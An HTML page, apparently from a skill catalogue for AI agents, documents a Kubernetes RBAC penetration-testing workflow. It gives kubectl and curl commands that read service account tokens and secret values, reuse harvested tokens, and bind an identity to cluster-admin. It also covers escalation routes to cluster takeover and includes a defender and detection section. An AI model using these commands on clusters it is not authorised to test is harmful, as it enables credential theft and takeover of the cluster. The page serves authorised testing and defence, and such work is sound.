@@ -1,0 +1,280 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<title>AgentArsenal: kubernetes-rbac</title>
+<style>
+:root {
+  --bg: #0d1117;
+  --panel: #161b22;
+  --border: #30363d;
+  --text: #e6edf3;
+  --muted: #8b949e;
+  --accent: #58a6ff;
+  --green: #3fb950;
+  --yellow: #d29922;
+  --red: #f85149;
+}
+* { box-sizing: border-box; }
+body {
+  background: var(--bg);
+  color: var(--text);
+  font-family: system-ui, -apple-system, "Segoe UI", Roboto, sans-serif;
+  margin: 0;
+  line-height: 1.6;
+}
+.wrap { max-width: 1100px; margin: 0 auto; padding: 1.5rem; }
+header.site {
+  border-bottom: 1px solid var(--border);
+  background: var(--panel);
+}
+header.site .wrap { display: flex; align-items: center; gap: 1.5rem; flex-wrap: wrap; }
+header.site h1 { font-size: 1.25rem; margin: 0; }
+header.site h1 a { color: var(--text); text-decoration: none; }
+nav a { color: var(--accent); text-decoration: none; margin-right: 1rem; }
+nav a:hover { text-decoration: underline; }
+table { width: 100%; border-collapse: collapse; margin-top: 1rem; }
+th, td { border: 1px solid var(--border); padding: 0.55rem 0.75rem; text-align: left; vertical-align: top; }
+th { background: var(--panel); }
+tbody tr:hover { background: rgba(88, 166, 255, 0.06); }
+a { color: var(--accent); }
+.muted { color: var(--muted); }
+.badge {
+  display: inline-block;
+  padding: 0.12rem 0.6rem;
+  border-radius: 999px;
+  font-size: 0.8rem;
+  font-weight: 600;
+  white-space: nowrap;
+}
+.badge.green { background: rgba(63, 185, 80, 0.12); color: var(--green); border: 1px solid var(--green); }
+.badge.yellow { background: rgba(210, 153, 34, 0.12); color: var(--yellow); border: 1px solid var(--yellow); }
+.badge.red { background: rgba(248, 81, 73, 0.12); color: var(--red); border: 1px solid var(--red); }
+.badge.gray { background: rgba(139, 148, 158, 0.12); color: var(--muted); border: 1px solid var(--muted); }
+#filter {
+  width: 100%;
+  max-width: 28rem;
+  padding: 0.6rem 0.8rem;
+  margin-top: 1rem;
+  background: var(--panel);
+  border: 1px solid var(--border);
+  border-radius: 6px;
+  color: var(--text);
+  font-size: 1rem;
+}
+pre {
+  background: var(--panel);
+  border: 1px solid var(--border);
+  border-radius: 6px;
+  padding: 1rem;
+  overflow-x: auto;
+}
+code { font-family: ui-monospace, SFMono-Regular, Menlo, Consolas, monospace; font-size: 0.9em; }
+pre code { font-size: 0.85rem; }
+p code, li code, td code {
+  background: rgba(88, 166, 255, 0.1);
+  border: 1px solid var(--border);
+  border-radius: 4px;
+  padding: 0.05rem 0.35rem;
+}
+.meta { display: flex; gap: 0.75rem; flex-wrap: wrap; margin: 1rem 0; align-items: center; }
+.deps { margin: 0.5rem 0; }
+.deps span.kind { color: var(--muted); font-size: 0.85rem; margin-right: 0.4rem; }
+.deps a { margin-right: 0.5rem; }
+h2 { border-bottom: 1px solid var(--border); padding-bottom: 0.4rem; }
+footer { border-top: 1px solid var(--border); margin-top: 2rem; padding: 1rem 0; color: var(--muted); font-size: 0.85rem; }
+.legend { display: flex; gap: 1.5rem; flex-wrap: wrap; margin: 1rem 0; color: var(--muted); font-size: 0.9rem; }
+.legend svg { vertical-align: middle; margin-right: 0.4rem; }
+.graph-note { color: var(--muted); font-size: 0.9rem; }
+</style>
+</head>
+<body>
+<header class="site">
+<div class="wrap">
+<h1><a href="../index.html">AgentArsenal</a></h1>
+<nav>
+<a href="../index.html">Skills</a>
+<a href="../graph.html">Dependency graph</a>
+</nav>
+</div>
+</header>
+<main class="wrap">
+<p><a href="../index.html">&larr; All skills</a></p><h2>kubernetes-rbac</h2><div class="meta"><span class="badge gray">cloud</span><span class="muted">v1.0.0</span><span class="badge green">stable</span><span class="badge green">100/100</span><span class="muted">verified 2026-10-23</span></div><p>Use when enumerating and testing Kubernetes RBAC during an</p><div class="deps"><span class="kind">requires:</span> <span class="muted">none</span></div><div class="deps"><span class="kind">extends:</span> <span class="muted">none</span></div><div class="deps"><span class="kind">relates:</span> <a href="container-escape.html">container-escape</a> <a href="cloud-security-basics.html">cloud-security-basics</a></div><h2>Tools</h2><table><thead><tr><th>Tool</th><th>Version</th></tr></thead><tbody><tr><td>kubectl</td><td>1.33</td></tr><tr><td>Python</td><td>3.12</td></tr></tbody></table><p>Kubernetes RBAC decides which identities can do what inside a cluster: read secrets, create privileged pods, or take over the whole control plane. Misconfigured bindings (cluster-admin for everyone, wildcard verbs, secrets readable by default service accounts) turn one compromised pod into full cluster control. This skill covers the authorized operator workflow: cluster context, self-permission checks, RBAC object enumeration, service account abuse, dangerous binding patterns, and safe proof of cluster takeover paths. Use it against your own clusters, in-scope bug bounty targets, and lab environments only. Never attack clusters you do not have written permission to test.</p>
+<h2>Quick Workflow</h2>
+<ol>
+<li>Confirm cluster context: <code>kubectl config</code>, current context,</li>
+<p>cluster endpoint, and your identity (<code>auth whoami</code>).</p>
+<li>List your own permissions: <code>auth can-i --list</code> in the working</li>
+<p>namespace and <code>--all-namespaces</code>.</p>
+<li>Enumerate RBAC objects: ClusterRoles, ClusterRoleBindings,</li>
+<p>Roles, and RoleBindings.</p>
+<li>Enumerate service accounts and their token secrets.</li>
+<li>Flag dangerous patterns: cluster-admin bindings, wildcard verbs,</li>
+<p>secrets read, pods/exec, impersonation rights.</p>
+<li>Map reachable paths: which service account can you become, and</li>
+<p>what does IT allow.</p>
+<li>Prove the highest reachable impact safely: read one secret</li>
+<p>name, create a pod only in your own lab namespace, then delete it.</p>
+<li>Record every binding, command, and output for the report.</li>
+</ol>
+<h2>1. Cluster context and identity</h2>
+<pre><code class="language-bash"># Current context, cluster endpoint, and user entry
+kubectl config current-context
+kubectl config view --minify --output &#x27;jsonpath={.clusters[0].cluster.server}{&quot;\n&quot;}&#x27;
+kubectl auth whoami 2&gt;/dev/null || echo &quot;auth whoami not supported by this version&quot;
+
+# Namespaces you can see
+kubectl get namespaces --output &#x27;jsonpath={range .items[*]}{.metadata.name}{&quot;\n&quot;}{end}&#x27;
+
+# Node and version overview
+kubectl get nodes --output &#x27;custom-columns=NAME:.metadata.name,VERSION:.status.nodeInfo.kubeletVersion&#x27;
+kubectl version --output=yaml 2&gt;/dev/null | head -10</code></pre>
+<h2>2. Self permission enumeration</h2>
+<p><code>can-i --list</code> is the fastest map of what YOU can do. Run it per namespace and once cluster-wide.</p>
+<pre><code class="language-bash"># Everything allowed in the current namespace
+kubectl auth can-i --list
+
+# Everything allowed across all namespaces (needs the right to ask)
+kubectl auth can-i --list --all-namespaces 2&gt;&amp;1 | head -60
+
+# Targeted checks for the dangerous verbs
+for v in &quot;get secrets&quot; &quot;list secrets&quot; &quot;create pods&quot; &quot;create pods/exec&quot; \
+         &quot;escalate&quot; &quot;bind&quot; &quot;impersonate&quot; &quot;create clusterrolebindings&quot;; do
+  kubectl auth can-i $v --all-namespaces 2&gt;/dev/null | grep -q yes \
+    &amp;&amp; echo &quot;ALLOWED: $v&quot;
+done</code></pre>
+<h2>3. RBAC object enumeration</h2>
+<pre><code class="language-bash"># ClusterRoles: the powerful reusable permission sets
+kubectl get clusterroles --output &#x27;custom-columns=NAME:.metadata.name&#x27; | head -30
+
+# ClusterRoleBindings: WHO gets cluster-wide power
+kubectl get clusterrolebindings \
+  --output &#x27;custom-columns=NAME:.metadata.name,ROLE:.roleRef.name,SUBJECTS:.subjects[*].name&#x27; \
+  | head -40
+
+# The big one: who is bound to cluster-admin
+kubectl get clusterrolebindings \
+  --output=json | python3 -c &quot;
+import json, sys
+d = json.load(sys.stdin)
+for b in d[&#x27;items&#x27;]:
+    if b[&#x27;roleRef&#x27;][&#x27;name&#x27;] == &#x27;cluster-admin&#x27;:
+        subs = [(s.get(&#x27;kind&#x27;), s.get(&#x27;name&#x27;), s.get(&#x27;namespace&#x27;,&#x27;-&#x27;)) for s in b.get(&#x27;subjects&#x27;, [])]
+        print(b[&#x27;metadata&#x27;][&#x27;name&#x27;], &#x27;-&gt;&#x27;, subs)
+&quot;
+
+# Namespaced roles and bindings (repeat per interesting namespace)
+kubectl get roles,rolebindings -n &lt;NAMESPACE&gt; \
+  --output &#x27;custom-columns=KIND:.kind,NAME:.metadata.name&#x27;</code></pre>
+<p>Read a suspicious ClusterRole&#x27;s actual rules:</p>
+<pre><code class="language-bash">kubectl get clusterrole &lt;NAME&gt; --output &#x27;jsonpath={.rules}&#x27; | python3 -m json.tool | head -40</code></pre>
+<p>Red flags in rules: <code>verbs: [&quot;*&quot;]</code>, <code>resources: [&quot;*&quot;]</code>, <code>resources: [&quot;secrets&quot;]</code> with get/list, <code>resources: [&quot;pods/exec&quot;]</code>, <code>nonResourceURLs: [&quot;*&quot;]</code>, and any rule with <code>escalate</code> or <code>bind</code>.</p>
+<h2>4. Service account enumeration and token abuse</h2>
+<p>Service accounts are the identities pods run as, and their tokens are bearer credentials.</p>
+<pre><code class="language-bash"># Service accounts per namespace
+kubectl get serviceaccounts -n &lt;NAMESPACE&gt; \
+  --output &#x27;custom-columns=NAME:.metadata.name&#x27;
+
+# Automount: does the pod get a token by default
+kubectl get serviceaccount default -n &lt;NAMESPACE&gt; \
+  --output &#x27;jsonpath={.automountServiceAccountToken}{&quot;\n&quot;}&#x27;
+
+# Token of the current identity (from inside a pod)
+cat /var/run/secrets/kubernetes.io/serviceaccount/token | cut -c1-50
+cat /var/run/secrets/kubernetes.io/serviceaccount/namespace
+
+# Use a harvested token from OUTSIDE the pod (scope-permitted only)
+kubectl --token=&quot;$TOKEN&quot; --server=https://&lt;CLUSTER-IP&gt;:6443 \
+  --insecure-skip-tls-verify auth can-i --list 2&gt;&amp;1 | head -20</code></pre>
+<p>Long-lived token secrets (pre-1.24 style) are still common in labs:</p>
+<pre><code class="language-bash">kubectl get secrets -n &lt;NAMESPACE&gt; --field-selector type=kubernetes.io/service-account-token \
+  --output &#x27;custom-columns=NAME:.metadata.name&#x27;</code></pre>
+<h2>5. Secrets access</h2>
+<pre><code class="language-bash"># Secret names cluster-wide (metadata only, safe first step)
+kubectl get secrets --all-namespaces \
+  --output &#x27;custom-columns=NS:.metadata.namespace,NAME:.metadata.name,TYPE:.type&#x27; \
+  | head -30
+
+# Read ONE secret value only when the scope allows it
+kubectl get secret &lt;NAME&gt; -n &lt;NAMESPACE&gt; --output jsonpath=&#x27;{.data}&#x27; \
+  | python3 -c &quot;import json,sys,base64; print({k: base64.b64decode(v)[:20] for k,v in json.load(sys.stdin).items()})&quot;</code></pre>
+<p>Truncate values in your notes; the finding is &quot;secret readable&quot;, not the secret itself. If secrets hold production credentials, report the exposure and stop.</p>
+<h2>6. Privilege paths to cluster takeover</h2>
+<p>Common chains, each proven with the smallest possible action:</p>
+<pre><code class="language-bash"># Path A: can create pods -&gt; privileged pod -&gt; node root (lab only)
+kubectl auth can-i create pods -n &lt;NAMESPACE&gt;
+# Pod spec with hostPath / and privileged: true, then chroot /host
+
+# Path B: can read secrets -&gt; service account tokens -&gt; stronger identity
+# Path C: can create clusterrolebindings -&gt; bind yourself to cluster-admin
+kubectl create clusterrolebinding privesc-test \
+  --clusterrole=cluster-admin \
+  --serviceaccount=&lt;NAMESPACE&gt;:default 2&gt;&amp;1 | head -3
+# Verify, then DELETE it immediately
+kubectl auth can-i --list --all-namespaces 2&gt;&amp;1 | head -5
+kubectl delete clusterrolebinding privesc-test
+
+# Path D: pods/exec into an existing privileged pod
+kubectl auth can-i create pods/exec -n &lt;NAMESPACE&gt;
+kubectl exec -n &lt;NAMESPACE&gt; &lt;POD&gt; -- id</code></pre>
+<p>Only execute writes (pod creation, binding creation) in your own lab namespaces or where the scope explicitly allows it, and delete everything you create.</p>
+<h2>7. Kubelet and API surface notes</h2>
+<pre><code class="language-bash"># Kubelet read-only port (legacy, often closed now)
+curl -s -k https://&lt;NODE-IP&gt;:10255/pods 2&gt;&amp;1 | head -c 200
+
+# API server anonymous access check (should be 403)
+curl -s -k https://&lt;CLUSTER-IP&gt;:6443/api/v1/namespaces 2&gt;&amp;1 | head -c 200</code></pre>
+<h2>Edge cases</h2>
+<ul>
+<li><code>auth can-i --list --all-namespaces</code> returns an error instead</li>
+<p>of a list: you lack the right to self-review cluster-wide. Fall back to per-namespace <code>--list</code> and targeted <code>can-i</code> checks.</p>
+<li>Aggregated ClusterRoles hide rules behind label selectors:</li>
+<p>read the aggregation rule AND the matching roles.</p>
+<li><code>system:</code> prefixed subjects (like</li>
+<p><code>system:serviceaccounts:&lt;ns&gt;</code>) bind EVERY service account in a namespace; one weak SA compromises the binding&#x27;s intent.</p>
+<li>Bound service account tokens (projected, time-limited) cannot</li>
+<p>be reused after expiry; note the audience and expiry in your report.</p>
+<li>Managed clusters (EKS, GKE, AKS) add a cloud IAM layer on top</li>
+<p>of RBAC: a Kubernetes admin may still be limited by the cloud role, and a cloud admin may reach the cluster through a separate binding.</p>
+<li><code>--insecure-skip-tls-verify</code> is for labs only; in real</li>
+<p>engagements use the cluster CA from the kubeconfig.</p>
+<li>Some clusters disable <code>auth whoami</code> on older API servers;</li>
+<p>identify yourself via the kubeconfig user entry instead.</p>
+</ul>
+<h2>Escalation</h2>
+<ul>
+<li>RBAC enumeration is blocked: pivot to the container-escape</li>
+<p>skill from inside a pod; a host shell often yields cluster credentials from the kubelet or static pod manifests.</p>
+<li>No pod creation but secrets readable: harvest service account</li>
+<p>tokens and test each one with <code>auth can-i --list</code> until you find the strongest reachable identity.</p>
+<li>Stuck as a weak service account: check for automounted cloud</li>
+<p>credentials in the pod (section 6 of container-escape) and pivot to the cloud IAM layer instead.</p>
+<li>Admission webhooks block privileged pods: try the binding</li>
+<p>path (Path C) or exec path (Path D), which webhooks often allow.</p>
+<li>All in-cluster paths dead: enumerate the cloud control plane</li>
+<p>(EKS access entries, GKE IAM bindings, AKS Azure RBAC) with the aws-enumeration, gcp-enumeration, or azure-enumeration skills.</p>
+</ul>
+<h2>Detection and defender view</h2>
+<p>Defenders see Kubernetes RBAC abuse in the API server audit log: <code>create clusterrolebinding</code>, <code>get secrets</code> bursts across namespaces, <code>create pods</code> with <code>privileged: true</code> or hostPath volumes, and token reviews from unfamiliar sources. Managed control planes ship these to cloud audit logs (CloudTrail, Azure Activity Log, GCP Audit Logs). Runtime tools and admission policies (OPA Gatekeeper, Kyverno) can deny privileged pods and wildcard bindings at creation time. Durable defenses are no cluster-admin bindings for humans or apps, no wildcard verbs in custom roles, <code>automountServiceAccountToken: false</code> where pods do not need the API, short-lived bound tokens, audit logging at Metadata level or higher with alerts on binding creation and secret reads, and regular RBAC reviews. As the tester, prove paths with the minimum write (create then immediately delete), never leave bindings or pods behind, and never read production secret values beyond what the scope allows.</p>
+<h2>Key references</h2>
+<ul>
+<li>MITRE ATT&amp;CK T1078.004 (Valid Accounts: Cloud Accounts):</li>
+<p>service account abuse.</p>
+<li>MITRE ATT&amp;CK T1552.007 (Unsecured Credentials: Container</li>
+<p>API): token and API abuse.</p>
+<li>MITRE ATT&amp;CK T1611 (Escape to Host): privileged pod to node.</li>
+<li>MITRE ATT&amp;CK T1580 (Cloud Infrastructure Discovery): cluster</li>
+<p>enumeration.</p>
+<li>Kubernetes RBAC documentation:</li>
+<p>https://kubernetes.io/docs/reference/access-authn-authz/rbac/</p>
+<li>kubectl auth reference:</li>
+<p>https://kubernetes.io/docs/reference/generated/kubectl/kubectl-commands#auth</p>
+<li>CIS Kubernetes Benchmark (RBAC sections).</li>
+</ul>
+</main>
+<footer class="wrap">
+<p>AgentArsenal docs. Generated 2026-10-23.</p>
+</footer>
+</body>
+</html>
